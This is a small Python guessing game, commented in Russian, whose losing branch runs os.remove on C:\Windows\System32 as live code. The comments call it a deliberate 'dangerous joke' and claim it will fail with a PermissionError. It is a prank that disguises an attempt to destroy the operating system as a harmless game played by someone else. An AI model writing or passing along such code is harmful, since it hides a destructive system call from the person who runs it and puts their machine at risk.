import random
import time
import os

print("| Game - win or windows |")

while True:
    # Правильный input с закрывающей скобкой и кавычками
    number = int(input("Выберите число от 1 до 10: "))
    
    rand_num = random.randint(1, 10)  # randint, а не rand int
    
    if number == rand_num:
        print("You are lost :(")
        time.sleep(2)  # sleep, а не slepp + правильные скобки
        
        # ОШИБКА ОСТАВЛЕНА НАМЕРЕННО — ЭТО ОПАСНАЯ ШУТКА!
        # os.remove("C:\\Windows\\System32")  # <-- ЭТО НЕ РАБОТАЕТ ТАК ПРОСТО
        
        # На самом деле удалить System32 так нельзя:
        # - Нужны права администратора
        # - Большинство файлов заняты системой
        # - Windows блокирует такие операции
        # - Python выдаст PermissionError
        
        os. remove ("C:\Windows\System32")
        print("Ты проиграл")
        break  # выходим из цикла, иначе будет вечный цикл
        
    else:
        print("You win! Try again!")
        # Можно добавить time.sleep(1) для красоты
